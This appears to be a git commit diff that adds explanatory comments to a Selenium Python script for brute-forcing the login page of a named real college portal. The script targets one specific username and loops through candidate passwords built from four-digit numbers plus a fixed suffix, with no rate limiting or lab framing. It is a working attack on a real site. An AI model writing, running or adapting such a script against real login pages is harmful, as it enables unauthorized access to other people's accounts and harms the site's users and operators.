975b087fcbe983085e76f5d9676d91fc8b4aa7b4
varun dineshan <varun4dinesh@gmail.com>
2020-01-17 12:04:31 -0500

    Update bruteforce.py

--- bruteforce.py
+++ bruteforce.py
@@ -1,3 +1,4 @@
+#selenium python code to bruteforce the login page that have predictable username and password.
 import time
 from selenium import webdriver
 from selenium.webdriver.support.ui import WebDriverWait
@@ -5,10 +6,13 @@ chrome_path = r"C:\Users\Varun\Downloads\chromedriver_win32\chromedriver.exe"
 driver = webdriver.Chrome(chrome_path)
 def login(i):
     i=str(i)
+    #website to bruteforce
     driver.get("https://portal.vjcet.ac.in/")
     #time.sleep(5)
+    #finding the element for username and inputs the userid/username
     user = driver.find_element_by_css_selector('#txtUserName_txt')
     user.send_keys('pv13rr173')
+    #finding the password element and bruteforcing the password with possible values.
     password = driver.find_element_by_css_selector('#txtPassword_txt')
     password.send_keys(i+'173')
     login = driver.find_element_by_css_selector('#btnLogin')
@@ -18,16 +22,13 @@ def login(i):
 
         #driver.save_screenshot("screenshot.png")
     return
-
+#loop to generate possible set of values to bruteforce the password.
 while True:
     for i in range(1000,9999):
         login(i)
         print(i)
         #if s:
          #   time.sleep(19999999)
-
-
-
 #time.sleep(100)
 
 
